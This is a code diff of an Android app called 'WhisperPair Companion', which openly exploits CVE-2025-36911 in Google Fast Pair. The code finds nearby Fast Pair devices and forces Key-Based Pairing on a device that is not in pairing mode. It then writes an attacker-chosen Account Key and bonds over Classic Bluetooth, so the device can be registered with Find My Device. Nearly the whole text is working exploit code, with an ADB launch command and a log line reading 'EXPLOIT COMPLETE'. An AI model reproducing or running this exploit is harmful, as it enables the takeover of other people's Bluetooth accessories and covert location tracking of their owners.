@@ -11,6 +11,11 @@ import android.bluetooth.BluetoothGattDescriptor;
 import android.bluetooth.BluetoothGattService;
 import android.bluetooth.BluetoothManager;
 import android.bluetooth.BluetoothProfile;
+import android.bluetooth.le.BluetoothLeScanner;
+import android.bluetooth.le.ScanCallback;
+import android.bluetooth.le.ScanFilter;
+import android.bluetooth.le.ScanResult;
+import android.bluetooth.le.ScanSettings;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -19,6 +24,7 @@ import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.os.ParcelUuid;
 import android.util.Log;
 import android.widget.TextView;
 import android.widget.ScrollView;
@@ -26,6 +32,8 @@ import android.widget.LinearLayout;
 import android.graphics.Typeface;
 
 import java.security.SecureRandom;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.UUID;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
@@ -33,14 +41,19 @@ import javax.crypto.spec.SecretKeySpec;
 /**
  * WhisperPair Companion - Performs Fast Pair KBP from the Android phone.
  *
- * This app exploits CVE-2025-36911: the target device accepts Key-Based Pairing
- * requests even when NOT in pairing mode. The phone connects via BLE, performs
- * KBP, creates a Classic BT bond, and writes an Account Key. Google Play Services
- * then detects the bond and registers the device with Find My Device.
+ * Exploits CVE-2025-36911: the target device accepts Key-Based Pairing
+ * requests even when NOT in pairing mode.
+ *
+ * Flow:
+ *   1. BLE scan → connect
+ *   2. KBP write (proves vulnerability)
+ *   3. Account Key write
+ *   4. Disconnect BLE
+ *   5. Classic BT discovery (find BR/EDR address by name)
+ *   6. Classic BT bond
  *
  * Launch via ADB:
- *   adb shell am start -a com.whisperpair.PAIR \
- *     --es address "AA:BB:CC:DD:EE:FF"
+ *   adb shell am start -a com.whisperpair.PAIR --es address "BLE_ADDR"
  */
 public class FastPairActivity extends Activity {
 
@@ -49,8 +62,6 @@ public class FastPairActivity extends Activity {
     // Fast Pair GATT UUIDs
     private static final UUID SERVICE_UUID =
             UUID.fromString("0000fe2c-0000-1000-8000-00805f9b34fb");
-    private static final UUID CHAR_MODEL_ID =
-            UUID.fromString("fe2c1233-8366-4814-8eb0-01de32100bea");
     private static final UUID CHAR_KEY_PAIRING =
             UUID.fromString("fe2c1234-8366-4814-8eb0-01de32100bea");
     private static final UUID CHAR_PASSKEY =
@@ -62,22 +73,32 @@ public class FastPairActivity extends Activity {
 
     private BluetoothAdapter btAdapter;
     private BluetoothGatt gatt;
-    private String targetAddress;
+    private String targetAddress;       // Current BLE address (updated after scan)
+    private String originalAddress;     // Address from intent
     private byte[] sharedSecret;
     private String brEdrAddress;
     private byte[] accountKey;
-    private boolean kbpAccepted = false;
-    private String deviceName; // Discovered during BLE, used to match Classic BT scan
+    private volatile boolean kbpAccepted = false;
+    private volatile boolean accountKeyWritten = false;
+    private volatile boolean reportDoneCalled = false;
+    private String deviceName;          // Learned during BLE, used for Classic BT match
+    private int connectAttempt = 0;
+
+    private BluetoothLeScanner bleScanner;
+    private ScanCallback scanCallback;
 
     private TextView logView;
     private ScrollView scrollView;
     private Handler mainHandler;
 
+    // =========================================================================
+    // LIFECYCLE
+    // =========================================================================
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // Simple log UI
         scrollView = new ScrollView(this);
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
@@ -92,31 +113,29 @@ public class FastPairActivity extends Activity {
 
         mainHandler = new Handler(Looper.getMainLooper());
 
-        // Get target address from intent
         Intent intent = getIntent();
         targetAddress = intent.getStringExtra("address");
+        originalAddress = targetAddress;
         String explicitBrEdr = intent.getStringExtra("bredr_address");
-        if (explicitBrEdr != null && !explicitBrEdr.isEmpty()) {
+        if (explicitBrEdr != null && !explicitBrEdr.isEmpty()
+                && !explicitBrEdr.equalsIgnoreCase(targetAddress)) {
             brEdrAddress = explicitBrEdr;
         }
 
         if (targetAddress == null || targetAddress.isEmpty()) {
             log("ERROR: No address provided");
-            log("Usage: adb shell am start -a com.whisperpair.PAIR --es address \"BLE_ADDR\" --es bredr_address \"BREDR_ADDR\"");
             return;
         }
 
         log("WhisperPair Companion - CVE-2025-36911");
         log("Target BLE: " + targetAddress);
         if (brEdrAddress != null) {
-            log("Target BR/EDR: " + brEdrAddress);
+            log("Explicit BR/EDR: " + brEdrAddress);
         }
         log("");
 
-        // Check permissions
         if (checkSelfPermission(Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED
                 || checkSelfPermission(Manifest.permission.BLUETOOTH_SCAN) != PackageManager.PERMISSION_GRANTED) {
-            log("Requesting Bluetooth permissions...");
             requestPermissions(new String[]{
                     Manifest.permission.BLUETOOTH_CONNECT,
                     Manifest.permission.BLUETOOTH_SCAN
@@ -127,52 +146,206 @@ public class FastPairActivity extends Activity {
     }
 
     @Override
+    protected void onNewIntent(Intent intent) {
+        super.onNewIntent(intent);
+        setIntent(intent);
+        // Reset all state so the new intent is processed fresh
+        stopBleScan();
+        closeGatt();
+        try { btAdapter.cancelDiscovery(); } catch (Exception ignored) {}
+        try { unregisterReceiver(discoveryReceiver); } catch (Exception ignored) {}
+        try { unregisterReceiver(classicBondReceiver); } catch (Exception ignored) {}
+        kbpAccepted = false;
+        accountKeyWritten = false;
+        reportDoneCalled = false;
+        discoveryActive = false;
+        connectAttempt = 0;
+        brEdrAddress = null;
+        sharedSecret = null;
+        accountKey = null;
+        deviceName = null;
+
+        targetAddress = intent.getStringExtra("address");
+        originalAddress = targetAddress;
+        String explicitBrEdr = intent.getStringExtra("bredr_address");
+        if (explicitBrEdr != null && !explicitBrEdr.isEmpty()
+                && !explicitBrEdr.equalsIgnoreCase(targetAddress)) {
+            brEdrAddress = explicitBrEdr;
+        }
+
+        // Clear log and restart
+        logView.setText("");
+        if (targetAddress == null || targetAddress.isEmpty()) {
+            log("ERROR: No address provided in new intent");
+            return;
+        }
+        log("WhisperPair Companion - CVE-2025-36911 (re-launched)");
+        log("Target BLE: " + targetAddress);
+        if (brEdrAddress != null) {
+            log("Explicit BR/EDR: " + brEdrAddress);
+        }
+        log("");
+        startExploit();
+    }
+
+    @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        boolean allGranted = true;
         for (int r : grantResults) {
             if (r != PackageManager.PERMISSION_GRANTED) {
-                allGranted = false;
-                break;
+                log("ERROR: Bluetooth permissions denied");
+                return;
             }
         }
-        if (allGranted) {
-            startExploit();
-        } else {
-            log("ERROR: Bluetooth permissions denied");
-        }
+        startExploit();
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        stopBleScan();
+        closeGatt();
+        try { btAdapter.cancelDiscovery(); } catch (Exception ignored) {}
+        try { unregisterReceiver(discoveryReceiver); } catch (Exception ignored) {}
+        try { unregisterReceiver(classicBondReceiver); } catch (Exception ignored) {}
     }
 
     private void startExploit() {
         BluetoothManager btManager = getSystemService(BluetoothManager.class);
         btAdapter = btManager.getAdapter();
-
         if (btAdapter == null || !btAdapter.isEnabled()) {
             log("ERROR: Bluetooth not available or disabled");
             return;
         }
+        startBleScan();
+    }
 
-        log("[1/7] Connecting to " + targetAddress + " via BLE...");
+    // =========================================================================
+    // PHASE 1: BLE SCAN — find the device at its current advertising address
+    // =========================================================================
 
-        BluetoothDevice device = btAdapter.getRemoteDevice(targetAddress);
+    private void startBleScan() {
+        bleScanner = btAdapter.getBluetoothLeScanner();
+        if (bleScanner == null) {
+            log("[1/7] BLE scanner unavailable, trying direct connect...");
+            connectToDevice(targetAddress);
+            return;
+        }
+
+        log("[1/7] Scanning for Fast Pair device...");
+
+        List<ScanFilter> filters = new ArrayList<>();
+        filters.add(new ScanFilter.Builder()
+                .setServiceUuid(new ParcelUuid(SERVICE_UUID))
+                .build());
+        ScanSettings settings = new ScanSettings.Builder()
+                .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
+                .build();
+
+        final ScanResult[] bestResult = {null};
+
+        scanCallback = new ScanCallback() {
+            @Override
+            public void onScanResult(int callbackType, ScanResult result) {
+                String addr = result.getDevice().getAddress();
+                String name = result.getDevice().getName();
+                int rssi = result.getRssi();
+
+                if (addr.equalsIgnoreCase(targetAddress) || addr.equalsIgnoreCase(originalAddress)) {
+                    log("[1/7] Found target: " + addr + nameTag(name) + " RSSI=" + rssi);
+                    stopBleScan();
+                    targetAddress = addr;
+                    connectToDevice(addr);
+                    return;
+                }
+
+                log("[1/7] Found: " + addr + nameTag(name) + " RSSI=" + rssi);
+                if (bestResult[0] == null || rssi > bestResult[0].getRssi()) {
+                    bestResult[0] = result;
+                }
+            }
+
+            @Override
+            public void onScanFailed(int errorCode) {
+                log("[1/7] Scan failed (error=" + errorCode + "), trying direct connect...");
+                connectToDevice(targetAddress);
+            }
+        };
+
+        try {
+            bleScanner.startScan(filters, settings, scanCallback);
+        } catch (SecurityException e) {
+            log("[1/7] Scan permission error, trying direct connect...");
+            connectToDevice(targetAddress);
+            return;
+        }
+
+        mainHandler.postDelayed(() -> {
+            stopBleScan();
+            if (gatt != null) return;
+
+            if (bestResult[0] != null) {
+                String addr = bestResult[0].getDevice().getAddress();
+                log("[1/7] Using strongest: " + addr + nameTag(bestResult[0].getDevice().getName()));
+                targetAddress = addr;
+                connectToDevice(addr);
+            } else {
+                log("[1/7] No Fast Pair device in scan, trying original address...");
+                connectToDevice(originalAddress);
+            }
+        }, 10000);
+    }
+
+    private void stopBleScan() {
+        if (bleScanner != null && scanCallback != null) {
+            try { bleScanner.stopScan(scanCallback); } catch (Exception ignored) {}
+            scanCallback = null;
+        }
+    }
+
+    // =========================================================================
+    // PHASE 2: BLE CONNECT with retry
+    // =========================================================================
+
+    private void connectToDevice(String address) {
+        connectAttempt++;
+        log("[2/7] Connecting to " + address + " (attempt " + connectAttempt + ")...");
+        BluetoothDevice device = btAdapter.getRemoteDevice(address);
         gatt = device.connectGatt(this, false, gattCallback, BluetoothDevice.TRANSPORT_LE);
     }
 
+    // =========================================================================
+    // PHASE 3-5: GATT operations (discover, KBP, account key)
+    // =========================================================================
+
     private final BluetoothGattCallback gattCallback = new BluetoothGattCallback() {
+
         @Override
         public void onConnectionStateChange(BluetoothGatt g, int status, int newState) {
             if (newState == BluetoothProfile.STATE_CONNECTED) {
-                // Capture device name for Classic BT discovery matching
                 BluetoothDevice dev = g.getDevice();
                 if (dev != null && dev.getName() != null) {
-                    deviceName = dev.getName().replace("LE_", "").replace("-GFP", "");
-                    log("[1/7] Connected! Device: " + dev.getName());
+                    deviceName = dev.getName();
+                    log("[2/7] Connected! Device: " + deviceName);
                 } else {
-                    log("[1/7] Connected!");
+                    log("[2/7] Connected!");
                 }
-                log("[2/7] Discovering services...");
                 g.discoverServices();
+
             } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
-                log("BLE disconnected (status=" + status + ")");
+                if (!kbpAccepted && connectAttempt < 3) {
+                    log("BLE disconnected (status=" + status + "), retrying...");
+                    g.close();
+                    gatt = null;
+                    mainHandler.postDelayed(() -> {
+                        if (!kbpAccepted) connectToDevice(targetAddress);
+                    }, 2000);
+                } else if (!reportDoneCalled) {
+                    log("BLE disconnected (status=" + status + ")");
+                    // If we already wrote the account key, proceed to Classic BT discovery
+                    if (accountKeyWritten) {
+                        startClassicDiscovery();
+                    }
+                }
             }
         }
 
@@ -188,12 +361,9 @@ public class FastPairActivity extends Activity {
                 log("ERROR: Fast Pair service (0xFE2C) not found");
                 return;
             }
-            log("[2/7] Fast Pair service found");
+            log("[3/7] Fast Pair service found");
 
-            // Subscribe to KBP notifications
             BluetoothGattCharacteristic kbpChar = service.getCharacteristic(CHAR_KEY_PAIRING);
-            BluetoothGattCharacteristic passkeyChar = service.getCharacteristic(CHAR_PASSKEY);
-
             if (kbpChar != null) {
                 g.setCharacteristicNotification(kbpChar, true);
                 BluetoothGattDescriptor desc = kbpChar.getDescriptor(CCCD);
@@ -202,7 +372,6 @@ public class FastPairActivity extends Activity {
                     g.writeDescriptor(desc);
                     log("[3/7] Subscribed to KBP notifications");
                 } else {
-                    // No CCCD, proceed anyway
                     sendKbpRequest(g);
                 }
             } else {
@@ -213,12 +382,12 @@ public class FastPairActivity extends Activity {
         @Override
         public void onDescriptorWrite(BluetoothGatt g, BluetoothGattDescriptor descriptor, int status) {
             if (status == BluetoothGatt.GATT_SUCCESS) {
-                // Also subscribe to passkey if available
                 BluetoothGattService service = g.getService(SERVICE_UUID);
                 BluetoothGattCharacteristic passkeyChar = service != null ?
                         service.getCharacteristic(CHAR_PASSKEY) : null;
 
-                if (passkeyChar != null && !descriptor.getCharacteristic().getUuid().equals(CHAR_PASSKEY)) {
+                if (passkeyChar != null
+                        && !descriptor.getCharacteristic().getUuid().equals(CHAR_PASSKEY)) {
                     g.setCharacteristicNotification(passkeyChar, true);
                     BluetoothGattDescriptor desc = passkeyChar.getDescriptor(CCCD);
                     if (desc != null) {
@@ -227,8 +396,6 @@ public class FastPairActivity extends Activity {
                         return;
                     }
                 }
-
-                // All subscriptions done, send KBP
                 sendKbpRequest(g);
             }
         }
@@ -239,53 +406,67 @@ public class FastPairActivity extends Activity {
                 if (status == BluetoothGatt.GATT_SUCCESS) {
                     kbpAccepted = true;
                     log("[4/7] KBP ACCEPTED - Device is VULNERABLE!");
-                    log("[5/7] Waiting for KBP response...");
+                    log("Waiting for KBP response...");
 
-                    // Timeout: if no KBP notification response, proceed anyway
                     mainHandler.postDelayed(() -> {
-                        if (brEdrAddress == null) {
-                            log("[5/7] No KBP response, using BLE address as BR/EDR fallback");
-                            brEdrAddress = targetAddress;
-                        } else {
-                            log("[5/7] No KBP response, using provided BR/EDR: " + brEdrAddress);
+                        if (!accountKeyWritten) {
+                            log("No KBP response, proceeding...");
+                            writeAccountKey(g);
                         }
-                        writeAccountKey(g);
                     }, 5000);
                 } else {
-                    log("ERROR: KBP rejected (status=" + status + ") - device may be patched");
-                    g.disconnect();
+                    log("ERROR: KBP rejected (status=" + status + ")");
+                    closeGatt();
+                    reportDone(false);
                 }
+
             } else if (c.getUuid().equals(CHAR_ACCOUNT_KEY)) {
                 if (status == BluetoothGatt.GATT_SUCCESS) {
-                    log("[6/7] Account Key written: " + bytesToHex(accountKey));
-
-                    // Create BLE bond before disconnecting
-                    createBond(g);
+                    log("[5/7] Account Key written: " + bytesToHex(accountKey));
                 } else {
                     log("WARNING: Account Key write failed (status=" + status + ")");
-                    createBond(g);
+                }
+
+                // Done with BLE GATT — disconnect and discover BR/EDR via Classic BT
+                closeGatt();
+
+                if (brEdrAddress != null) {
+                    // Already have BR/EDR address (from KBP response or intent)
+                    log("BR/EDR address known: " + brEdrAddress + ", bonding...");
+                    bondClassicBt(btAdapter.getRemoteDevice(brEdrAddress));
+                } else {
+                    // Discover BR/EDR address via Classic BT inquiry
+                    startClassicDiscovery();
                 }
             }
         }
 
         @Override
         public void onCharacteristicChanged(BluetoothGatt g, BluetoothGattCharacteristic c) {
-            byte[] value = c.getValue();
-            if (value == null) return;
+            handleNotification(g, c.getUuid(), c.getValue());
+        }
 
-            log("Notification from " + c.getUuid() + ": " + bytesToHex(value));
-
-            if (c.getUuid().equals(CHAR_KEY_PAIRING) && value.length >= 16) {
-                // Try to parse BR/EDR address from KBP response
-                String addr = parseKbpResponse(value);
-                if (addr != null && brEdrAddress == null) {
-                    brEdrAddress = addr;
-                    log("[5/7] BR/EDR address: " + brEdrAddress);
-                    writeAccountKey(g);
-                }
-            }
+        @Override
+        public void onCharacteristicChanged(BluetoothGatt g, BluetoothGattCharacteristic c, byte[] value) {
+            handleNotification(g, c.getUuid(), value);
         }
     };
+
+    private void handleNotification(BluetoothGatt g, UUID charUuid, byte[] value) {
+        if (value == null || value.length == 0) return;
+        log("Notification: " + bytesToHex(value) + " (" + value.length + " bytes)");
+
+        if (charUuid.equals(CHAR_KEY_PAIRING) && value.length >= 16) {
+            String addr = parseKbpResponse(value);
+            if (addr != null && brEdrAddress == null) {
+                brEdrAddress = addr;
+                log("BR/EDR from KBP response: " + brEdrAddress);
+            }
+            if (!accountKeyWritten) {
+                writeAccountKey(g);
+            }
+        }
+    }
 
     private void sendKbpRequest(BluetoothGatt g) {
         log("[4/7] Sending KBP request (CVE-2025-36911)...");
@@ -293,59 +474,59 @@ public class FastPairActivity extends Activity {
         BluetoothGattService service = g.getService(SERVICE_UUID);
         BluetoothGattCharacteristic kbpChar = service.getCharacteristic(CHAR_KEY_PAIRING);
 
-        // Build raw KBP request
         byte[] request = new byte[16];
         request[0] = 0x00; // Key-Based Pairing Request
         request[1] = 0x01; // Flags: initiate bonding
 
-        // Target address bytes (big-endian)
         String[] parts = targetAddress.split(":");
         for (int i = 0; i < 6 && i < parts.length; i++) {
             request[2 + i] = (byte) Integer.parseInt(parts[i], 16);
         }
 
-        // Salt (random 8 bytes) - also used as shared secret
         SecureRandom rng = new SecureRandom();
         byte[] salt = new byte[8];
         rng.nextBytes(salt);
         System.arraycopy(salt, 0, request, 8, 8);
 
-        // Shared secret = salt padded to 16 bytes
         sharedSecret = new byte[16];
         System.arraycopy(salt, 0, sharedSecret, 0, 8);
 
+        log("  Request: " + bytesToHex(request));
         kbpChar.setValue(request);
         kbpChar.setWriteType(BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT);
         g.writeCharacteristic(kbpChar);
     }
 
     private void writeAccountKey(BluetoothGatt g) {
-        log("[6/7] Writing Account Key...");
+        if (accountKeyWritten) return;
+        accountKeyWritten = true;
+
+        log("[5/7] Writing Account Key...");
 
         BluetoothGattService service = g.getService(SERVICE_UUID);
+        if (service == null) {
+            log("WARNING: Service lost");
+            closeGatt();
+            startClassicDiscovery();
+            return;
+        }
         BluetoothGattCharacteristic akChar = service.getCharacteristic(CHAR_ACCOUNT_KEY);
-
         if (akChar == null) {
             log("WARNING: Account Key characteristic not found");
-            createBond(g);
+            closeGatt();
+            startClassicDiscovery();
             return;
         }
 
-        // Generate Account Key
         accountKey = new byte[16];
-        accountKey[0] = 0x04; // Account Key type
-        SecureRandom rng = new SecureRandom();
-        byte[] randomPart = new byte[15];
-        rng.nextBytes(randomPart);
-        System.arraycopy(randomPart, 0, accountKey, 1, 15);
+        accountKey[0] = 0x04;
+        new SecureRandom().nextBytes(accountKey);
+        accountKey[0] = 0x04; // Restore type byte after random fill
 
-        // Encrypt with shared secret
         byte[] dataToWrite;
         if (sharedSecret != null) {
             dataToWrite = aesEncrypt(sharedSecret, accountKey);
-            if (dataToWrite == null) {
-                dataToWrite = accountKey; // Fallback: unencrypted
-            }
+            if (dataToWrite == null) dataToWrite = accountKey;
         } else {
             dataToWrite = accountKey;
         }
@@ -355,56 +536,154 @@ public class FastPairActivity extends Activity {
         g.writeCharacteristic(akChar);
     }
 
-    private void createBond(BluetoothGatt g) {
-        // Disconnect BLE first — we're done with GATT operations
-        g.disconnect();
+    // =========================================================================
+    // PHASE 6: CLASSIC BT DISCOVERY — find BR/EDR address by device name
+    // =========================================================================
 
-        if (brEdrAddress != null && !brEdrAddress.equals(targetAddress)) {
-            // We have an explicit BR/EDR address — go straight to Classic BT
-            log("[7/7] Pairing via Classic BT with " + brEdrAddress + "...");
-            classicPairAttempted = true;
+    private volatile boolean discoveryActive = false;
 
-            IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_BOND_STATE_CHANGED);
-            registerReceiver(bondReceiver, filter);
+    private void startClassicDiscovery() {
+        if (discoveryActive || reportDoneCalled) return;
+        discoveryActive = true;
 
-            BluetoothDevice device = btAdapter.getRemoteDevice(brEdrAddress);
-            boolean started = false;
-            try {
-                java.lang.reflect.Method m = BluetoothDevice.class.getMethod("createBond", int.class);
-                started = (boolean) m.invoke(device, 1); // TRANSPORT_BREDR
-                log("  createBond(BREDR) returned: " + started);
-            } catch (Exception e) {
-                started = device.createBond();
-                log("  createBond() returned: " + started);
-            }
-
-            if (!started) {
-                log("WARNING: createBond() returned false");
-                try { unregisterReceiver(bondReceiver); } catch (Exception ignored) {}
-                reportDone(false);
-            }
-        } else {
-            // No BR/EDR address — try LE bond and hope for address resolution
-            log("[7/7] Creating BLE bond (no BR/EDR address available)...");
-
-            IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_BOND_STATE_CHANGED);
-            registerReceiver(bondReceiver, filter);
-
-            BluetoothDevice device = btAdapter.getRemoteDevice(targetAddress);
-            boolean started = device.createBond();
-            log("  createBond() returned: " + started);
-
-            if (!started) {
-                log("WARNING: createBond() returned false");
-                try { unregisterReceiver(bondReceiver); } catch (Exception ignored) {}
-                reportDone(false);
-            }
+        // Build search name by stripping BLE-specific suffixes
+        String searchName = null;
+        if (deviceName != null) {
+            searchName = deviceName
+                    .replace("-LE", "").replace("-GFP", "")
+                    .replace("LE_", "").replace(" LE", "")
+                    .trim();
         }
+
+        if (searchName == null || searchName.isEmpty()) {
+            log("[6/7] No device name available for Classic BT discovery");
+            reportDone(kbpAccepted);
+            return;
+        }
+
+        log("[6/7] Classic BT discovery for '" + searchName + "'...");
+        classicSearchName = searchName;
+
+        IntentFilter filter = new IntentFilter();
+        filter.addAction(BluetoothDevice.ACTION_FOUND);
+        filter.addAction(BluetoothAdapter.ACTION_DISCOVERY_FINISHED);
+        registerReceiver(discoveryReceiver, filter);
+
+        boolean started;
+        try {
+            started = btAdapter.startDiscovery();
+        } catch (SecurityException e) {
+            log("ERROR: Discovery permission denied");
+            try { unregisterReceiver(discoveryReceiver); } catch (Exception ignored) {}
+            reportDone(kbpAccepted);
+            return;
+        }
+
+        if (!started) {
+            log("WARNING: startDiscovery() returned false");
+            try { unregisterReceiver(discoveryReceiver); } catch (Exception ignored) {}
+            reportDone(kbpAccepted);
+            return;
+        }
+
+        // Safety timeout — Classic BT inquiry typically finishes in ~12s
+        mainHandler.postDelayed(() -> {
+            if (!reportDoneCalled && discoveryActive) {
+                log("Classic BT discovery timeout");
+                try { btAdapter.cancelDiscovery(); } catch (Exception ignored) {}
+                try { unregisterReceiver(discoveryReceiver); } catch (Exception ignored) {}
+                discoveryActive = false;
+                reportDone(kbpAccepted);
+            }
+        }, 20000);
     }
 
-    private boolean classicPairAttempted = false;
+    private String classicSearchName;
 
-    private final BroadcastReceiver bondReceiver = new BroadcastReceiver() {
+    private final BroadcastReceiver discoveryReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            String action = intent.getAction();
+            if (action == null) return;
+
+            if (BluetoothDevice.ACTION_FOUND.equals(action)) {
+                BluetoothDevice device = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
+                if (device == null) return;
+
+                String name = device.getName();
+                String addr = device.getAddress();
+
+                if (name == null) return;
+                log("  Discovered: " + addr + " (" + name + ")");
+
+                // Match by name (case-insensitive substring)
+                if (classicSearchName != null
+                        && name.toLowerCase().contains(classicSearchName.toLowerCase())) {
+                    log("[6/7] Found BR/EDR: " + addr + " (" + name + ")");
+                    brEdrAddress = addr;
+                    discoveryActive = false;
+
+                    try { btAdapter.cancelDiscovery(); } catch (Exception ignored) {}
+                    try { unregisterReceiver(this); } catch (Exception ignored) {}
+
+                    bondClassicBt(device);
+                }
+
+            } else if (BluetoothAdapter.ACTION_DISCOVERY_FINISHED.equals(action)) {
+                discoveryActive = false;
+                if (brEdrAddress == null) {
+                    log("[6/7] Classic BT discovery finished — device not found");
+                    try { unregisterReceiver(this); } catch (Exception ignored) {}
+                    reportDone(kbpAccepted);
+                }
+            }
+        }
+    };
+
+    // =========================================================================
+    // PHASE 7: CLASSIC BT BONDING
+    // =========================================================================
+
+    private void bondClassicBt(BluetoothDevice device) {
+        log("[7/7] Classic BT bonding with " + device.getAddress() + "...");
+
+        IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_BOND_STATE_CHANGED);
+        registerReceiver(classicBondReceiver, filter);
+
+        boolean started;
+        try {
+            // Use reflection to specify TRANSPORT_BREDR (= 1)
+            java.lang.reflect.Method m = BluetoothDevice.class.getMethod("createBond", int.class);
+            started = (boolean) m.invoke(device, 1);
+            log("  createBond(BREDR) returned: " + started);
+        } catch (Exception e) {
+            started = device.createBond();
+            log("  createBond() returned: " + started);
+        }
+
+        if (!started) {
+            // Check if already bonded
+            if (device.getBondState() == BluetoothDevice.BOND_BONDED) {
+                log("  Already bonded!");
+                brEdrAddress = device.getAddress();
+                try { unregisterReceiver(classicBondReceiver); } catch (Exception ignored) {}
+                reportDone(true);
+                return;
+            }
+            log("WARNING: createBond returned false");
+        }
+
+        // Timeout for Classic BT bonding
+        mainHandler.postDelayed(() -> {
+            if (!reportDoneCalled) {
+                log("Classic BT bond timeout");
+                try { unregisterReceiver(classicBondReceiver); } catch (Exception ignored) {}
+                reportDone(kbpAccepted);
+            }
+        }, 25000);
+    }
+
+    private final BroadcastReceiver classicBondReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             if (!BluetoothDevice.ACTION_BOND_STATE_CHANGED.equals(intent.getAction())) return;
@@ -414,81 +693,59 @@ public class FastPairActivity extends Activity {
 
             switch (state) {
                 case BluetoothDevice.BOND_BONDING:
-                    log("  Bonding in progress...");
+                    log("  Classic BT bonding in progress...");
                     break;
+
                 case BluetoothDevice.BOND_BONDED:
-                    String bondedAddr = device != null ? device.getAddress() : "unknown";
-                    int devType = device != null ? device.getType() : -1;
-                    // type: 1=Classic, 2=LE, 3=Dual
-                    log("  LE bond created with resolved address: " + bondedAddr + " (type=" + devType + ")");
-
-                    if (!classicPairAttempted && devType == BluetoothDevice.DEVICE_TYPE_LE) {
-                        // LE-only bond. Try Classic BT with the resolved identity address.
-                        classicPairAttempted = true;
-                        log("[8/7] Attempting Classic BT bond with resolved address " + bondedAddr + "...");
-
-                        if (gatt != null) gatt.disconnect();
-
-                        // Remove the LE bond first, then try Classic
-                        try {
-                            java.lang.reflect.Method removeBond = device.getClass().getMethod("removeBond");
-                            removeBond.invoke(device);
-                            log("  Removed LE bond, waiting before Classic BT attempt...");
-                        } catch (Exception e) {
-                            log("  Could not remove LE bond: " + e.getMessage());
-                        }
-
-                        mainHandler.postDelayed(() -> {
-                            BluetoothDevice classicDev = btAdapter.getRemoteDevice(bondedAddr);
-                            try {
-                                java.lang.reflect.Method m = BluetoothDevice.class.getMethod("createBond", int.class);
-                                boolean ok = (boolean) m.invoke(classicDev, 1); // TRANSPORT_BREDR
-                                log("  createBond(BREDR) on " + bondedAddr + ": " + ok);
-                            } catch (Exception e) {
-                                log("  BREDR reflection failed, trying default createBond");
-                                classicDev.createBond();
-                            }
-                        }, 3000);
-                    } else {
-                        // Either it's already Classic/Dual, or our Classic attempt completed
-                        String typeStr = devType == 1 ? "Classic" : devType == 2 ? "LE" : devType == 3 ? "Dual" : "unknown";
-                        log("[DONE] Device bonded as " + typeStr + " at " + bondedAddr);
-                        try { unregisterReceiver(this); } catch (Exception ignored) {}
-                        reportDone(true);
-                    }
+                    String addr = device != null ? device.getAddress() : brEdrAddress;
+                    int type = device != null ? device.getType() : -1;
+                    String typeStr = type == 1 ? "Classic" : type == 3 ? "Dual" : "type=" + type;
+                    log("  Classic BT bonded: " + addr + " (" + typeStr + ")");
+                    brEdrAddress = addr;
+                    try { unregisterReceiver(this); } catch (Exception ignored) {}
+                    reportDone(true);
                     break;
+
                 case BluetoothDevice.BOND_NONE:
-                    if (classicPairAttempted) {
-                        log("WARNING: Classic BT bonding failed");
-                        try { unregisterReceiver(this); } catch (Exception ignored) {}
-                        reportDone(false);
-                    } else {
-                        log("WARNING: LE bonding failed");
-                        if (gatt != null) gatt.disconnect();
-                        try { unregisterReceiver(this); } catch (Exception ignored) {}
-                        reportDone(false);
-                    }
+                    log("  Classic BT bond failed");
+                    try { unregisterReceiver(this); } catch (Exception ignored) {}
+                    reportDone(kbpAccepted);
                     break;
             }
         }
     };
 
+    // =========================================================================
+    // RESULTS
+    // =========================================================================
+
     private void reportDone(boolean success) {
+        if (reportDoneCalled) return;
+        reportDoneCalled = true;
+
         log("");
-        if (success) {
+        if (success && kbpAccepted) {
             log("=== EXPLOIT COMPLETE ===");
-            log("Device bonded with this phone via KBP bypass (CVE-2025-36911).");
-            log("Account Key injected. Google Play Services should detect");
-            log("the device and register it with Find My Device.");
-            log("");
-            log("Check: Settings > Google > Devices & sharing > Find My Device");
-        } else {
+            log("KBP accepted (CVE-2025-36911 confirmed).");
+            if (accountKey != null) {
+                log("Account Key written: " + bytesToHex(accountKey));
+            }
+            if (brEdrAddress != null) {
+                log("BR/EDR address: " + brEdrAddress);
+                log("Classic BT paired: YES");
+            } else {
+                log("BR/EDR address: not resolved");
+            }
+        } else if (kbpAccepted) {
             log("=== PARTIAL SUCCESS ===");
-            log("KBP was accepted (device IS vulnerable) and Account Key");
-            log("was written, but bonding did not complete.");
+            log("KBP accepted (device IS vulnerable) but pairing did not complete.");
+        } else {
+            log("=== FAILED ===");
+            log("Could not connect or KBP was rejected.");
         }
 
-        // Send result back via broadcast (for dashboard to pick up)
+        log("RESOLVED_BREDR_ADDRESS=" + (brEdrAddress != null ? brEdrAddress : "UNKNOWN"));
+
         Intent result = new Intent("com.whisperpair.RESULT");
         result.putExtra("success", success);
         result.putExtra("kbp_accepted", kbpAccepted);
@@ -499,35 +756,49 @@ public class FastPairActivity extends Activity {
         sendBroadcast(result);
     }
 
-    // --- Crypto helpers ---
+    // =========================================================================
+    // HELPERS
+    // =========================================================================
+
+    private void closeGatt() {
+        if (gatt != null) {
+            try { gatt.disconnect(); } catch (Exception ignored) {}
+            try { gatt.close(); } catch (Exception ignored) {}
+            gatt = null;
+        }
+    }
+
+    private static String nameTag(String name) {
+        return name != null ? " (" + name + ")" : "";
+    }
 
     private String parseKbpResponse(byte[] data) {
